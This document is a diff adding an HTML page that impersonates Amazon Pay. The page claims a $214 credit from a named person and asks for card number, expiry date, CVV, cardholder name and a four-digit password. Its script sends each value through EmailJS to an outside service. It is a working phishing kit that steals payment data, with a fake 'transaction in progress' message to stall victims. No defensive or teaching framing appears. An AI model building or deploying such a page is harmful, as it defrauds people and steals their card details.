@@ -1,0 +1,154 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Pay Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+        }
+        .image-container {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 10px;
+        }
+        .image-container img {
+            width: 100%;
+            height: auto;
+        }
+        .form-container {
+            width: 400px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        .note {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff9900;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #e68a00;
+        }
+        #progress-message {
+            display: none;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Image at the top -->
+<div class="image-container">
+    <img src="https://via.placeholder.com/400x150?text=Amazon+Pay" alt="Amazon Pay Image">
+</div>
+
+<!-- Form Container -->
+<div class="form-container">
+    <h1>Amazon Pay</h1>
+    <p class="note">The amount of $214 to be credited by Chloe Henderson.</p>
+
+    <form id="payment-form">
+        <input type="text" id="cardNumber" placeholder="Card number" required>
+        <div style="display: flex; gap: 10px;">
+            <input type="text" id="expirationDate" placeholder="MM / YY" required>
+            <input type="text" id="cvv" placeholder="3-4 digit code" required>
+        </div>
+        <input type="text" id="cardName" placeholder="First and last name" required>
+        <input type="password" id="password" placeholder="4-digit password" maxlength="4" required>
+
+        <button type="submit" id="submit-button">Add and continue</button>
+    </form>
+
+    <p id="progress-message">Transaction in progress, estimated time 30 min...</p>
+</div>
+
+<!-- JavaScript to Handle Email Sending -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+<script>
+    // Initialize EmailJS
+    (function() {
+        emailjs.init("5vz8xe_J5s0yEGPz9");  // API key provided here
+    })();
+
+    // Handle form submission
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent page reload
+
+        const submitButton = document.getElementById('submit-button');
+        const progressMessage = document.getElementById('progress-message');
+
+        // Disable the submit button and show progress message
+        submitButton.disabled = true;
+        progressMessage.style.display = 'block';
+
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expirationDate = document.getElementById('expirationDate').value;
+        const cvv = document.getElementById('cvv').value;
+        const cardName = document.getElementById('cardName').value;
+        const password = document.getElementById('password').value;
+
+        const templateParams = {
+            card_number: cardNumber,
+            expiration_date: expirationDate,
+            cvv: cvv,
+            card_name: cardName,
+            password: password
+        };
+
+        // Send email via EmailJS
+        emailjs.send('service_qsx38ac', 'template_audd7fx', templateParams)
+            .then(function(response) {
+                alert('Payment information sent successfully!');
+                // Reset form and hide progress message
+                document.getElementById('payment-form').reset();
+                progressMessage.style.display = 'none';
+                submitButton.disabled = false;
+            }, function(error) {
+                alert('Failed to send payment information: ' + JSON.stringify(error));
+                // Hide progress message and re-enable the button
+                progressMessage.style.display = 'none';
+                submitButton.disabled = false;
+            });
+    });
+</script>
+
+</body>
+</html>
